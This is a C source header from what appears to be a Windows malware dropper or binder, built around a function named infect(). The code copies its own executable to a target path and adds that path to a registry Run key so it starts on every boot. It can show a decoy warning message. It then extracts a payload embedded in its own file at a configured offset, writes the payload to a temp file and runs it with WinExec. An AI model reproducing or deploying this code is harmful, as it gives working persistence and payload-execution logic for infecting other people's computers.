#ifndef _INFECT_INCLUDED_
#define _INFECT_INCLUDED_


#include "crypt.c"
#include "paths.c"
#include "regist.c"

void infectshow();

int infect()// return 0 if no problem, 1 if just installed
{
char bf[200];
decrypt();
regist_get(crypt.reg_run,crypt.val_run,(char*)bf);
if(bf[0]!=0){ return 0; };
CopyFile(paths_exe(),paths_target(),FALSE);
regist_set(crypt.reg_run,crypt.val_run,paths_target());
infectshow();
return 1;
}

void infectshow()
{
if(crypt.warn_show==1){ MessageBox(GetDesktopWindow(),crypt.warn_text,crypt.warn_title,MB_OK|MB_ICONWARNING); };

char bbuuff[513];
HANDLE f1,f2;
DWORD sz;
f1=CreateFile(paths_exe(),GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
f2=CreateFile(paths_temp(),GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
if(f1==INVALID_HANDLE_VALUE||f1==0||f2==INVALID_HANDLE_VALUE||f2==0){ return; };
SetFilePointer(f1,crypt.exe_ptr,NULL,FILE_BEGIN);

bb1:sz=0;
ReadFile(f1,bbuuff,512,&sz,NULL);
if(sz==0){ goto bb2; };
WriteFile(f2,bbuuff,sz,&sz,NULL);
if(sz==512){ goto bb1; };
bb2:;

CloseHandle(f1);
CloseHandle(f2);

WinExec(paths_temp(),SW_RESTORE);
}


#endif
